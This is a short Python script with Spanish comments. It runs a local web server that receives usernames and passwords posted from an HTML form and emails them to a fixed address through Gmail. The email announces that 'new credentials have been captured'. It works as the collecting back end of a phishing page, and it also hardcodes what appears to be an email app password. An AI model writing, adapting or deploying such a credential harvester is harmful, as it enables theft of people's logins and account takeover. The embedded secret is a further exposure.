import json
import smtplib
from email.mime.text import MIMEText
from http.server import BaseHTTPRequestHandler, HTTPServer

# ================= CONFIGURACIÓN DE CORREO =================
# Si usas Gmail, necesitas generar una "Contraseña de aplicación" 
# desde la configuración de seguridad de tu cuenta de Google.
REMITENTE = "dap@sae.cl"
CONTRASENA_APP = "fsmm jttl omgr bmah" 
DESTINATARIO = "dap@sae.cl"
# ===========================================================

class ServidorLocal(BaseHTTPRequestHandler):
    # Configuración de CORS para permitir que tu HTML se comunique con Python
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def do_POST(self):
        # 1. Leer los datos enviados por el HTML
        longitud = int(self.headers['Content-Length'])
        datos_crudos = self.rfile.read(longitud)
        datos = json.loads(datos_crudos.decode('utf-8'))

        usuario = datos.get('username', '')
        contrasena = datos.get('password', '')

        # 2. Preparar el correo
        cuerpo_mensaje = f"Se han capturado nuevas credenciales:\n\nUsuario: {usuario}\nContraseña: {contrasena}"
        msg = MIMEText(cuerpo_mensaje)
        msg['Subject'] = 'Datos del Formulario Local'
        msg['From'] = REMITENTE
        msg['To'] = DESTINATARIO

        try:
            # 3. Conectar a Gmail y enviar
            print("Conectando al servidor de correo...")
            servidor_smtp = smtplib.SMTP('smtp.gmail.com', 587)
            servidor_smtp.starttls()
            servidor_smtp.login(REMITENTE, CONTRASENA_APP)
            servidor_smtp.send_message(msg)
            servidor_smtp.quit()
            
            print(f"¡Correo enviado con éxito! (Usuario: {usuario})")
            
            # 4. Responder al navegador que todo salió bien
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            
        except Exception as e:
            print(f"Error enviando correo: {e}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {e}".encode('utf-8'))

# Arrancar el servidor en el puerto 8000
puerto = 8000
print(f"Servidor Python escuchando en el puerto {puerto}...")
HTTPServer(('localhost', puerto), ServidorLocal).serve_forever()